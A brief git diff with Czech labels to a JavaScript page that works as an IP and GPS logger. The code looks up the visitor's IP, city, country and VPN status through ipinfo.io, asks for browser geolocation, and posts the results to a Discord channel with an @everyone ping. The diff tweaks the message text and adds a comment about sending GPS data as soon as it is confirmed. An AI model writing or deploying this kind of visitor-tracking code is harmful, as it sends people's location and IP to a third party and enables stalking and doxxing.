@@ -24,7 +24,7 @@
             fetch("https://ipinfo.io/json")
             .then(response => response.json())
             .then(data => {
-                const message = `@everyone\n📱 Zařízení: ${device}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})\n🌐 VPN: ${isVPN()}\n${gpsData}`;
+                const message = `@everyone\n📱 Zařízení: ${device}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})\nVPN: ${isVPN()}\n${gpsData}`;
 
                 sendToDiscord(message);
             })
@@ -42,6 +42,8 @@
                     const lat = position.coords.latitude.toFixed(6);
                     const lon = position.coords.longitude.toFixed(6);
                     gpsConfirmed = true;
+
+                    // Po potvrzení GPS okamžitě odeslat GPS data
                     getIP(device, `📍 GPS: ${lat}, ${lon}`);
                 }, () => {
                     getIP(device, "🚫 GPS zamítnuta");
